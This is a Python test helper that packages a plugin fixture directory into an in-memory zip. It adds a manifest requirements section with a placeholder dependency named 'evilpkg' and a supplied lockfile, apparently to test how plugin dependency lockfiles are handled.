def _compliments_zip_with_lockfile(lock_text: str, requirement: str = "evilpkg==0.0.0") -> bytes:
    import io
    import zipfile

    manifest = (FIXTURE / "domovoi-plugin.toml").read_text(encoding="utf-8") + (
        f'\n[requirements]\npython = ["{requirement}"]\n'
        'lockfile = "requirements.lock"\n'
    )
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for f in sorted(FIXTURE.rglob("*")):
            if f.is_dir() or "__pycache__" in f.parts:
                continue
            rel = f.relative_to(FIXTURE).as_posix()
            zf.writestr(rel, manifest if rel == "domovoi-plugin.toml" else f.read_bytes())
        zf.writestr("requirements.lock", lock_text)
    return buf.getvalue()


